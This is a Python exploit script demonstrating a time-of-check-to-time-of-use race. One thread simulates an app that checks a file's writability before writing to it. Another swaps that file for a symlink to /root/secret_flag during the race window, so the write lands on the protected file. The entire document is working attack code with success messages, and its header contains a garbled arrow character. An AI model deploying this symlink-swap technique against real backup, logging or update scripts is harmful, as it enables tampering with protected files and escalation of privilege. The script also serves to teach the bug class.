#!/usr/bin/env python3
# TOCTOU Permission Race Exploit
# Vulnerable: check if file is writable â†’ then write (without recheck)
# Common in backup, logging, update scripts

import os
import threading
import time

TARGET = "/tmp/shared_resource"
PROTECTED = "/root/secret_flag"

def vulnerable_writer():
    """Simulates app that checks writability then writes"""
    while True:
        # Check phase
        if os.access(TARGET, os.W_OK):
            try:
                # Use phase - race here!
                with open(TARGET, 'w') as f:
                    f.write("compromised_data\n")
                print(f"[!] TOCTOU PERMISSION SUCCESS! Wrote to swapped target")
                break
            except PermissionError:
                pass
        time.sleep(0.01)

def permission_swapper():
    """Swaps writable file with protected one"""
    time.sleep(0.5)
    # Create writable target
    open(TARGET, 'w').close()
    os.chmod(TARGET, 0o666)
    
    for _ in range(500):
        time.sleep(0.002)
        # Swap during race window
        try:
            os.replace(TARGET, TARGET + ".bak")
            os.symlink(PROTECTED, TARGET)
        except:
            pass

print("[*] Starting TOCTOU permission race exploit...")
threading.Thread(target=vulnerable_writer, daemon=True).start()
threading.Thread(target=permission_swapper).start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Cleanup complete")
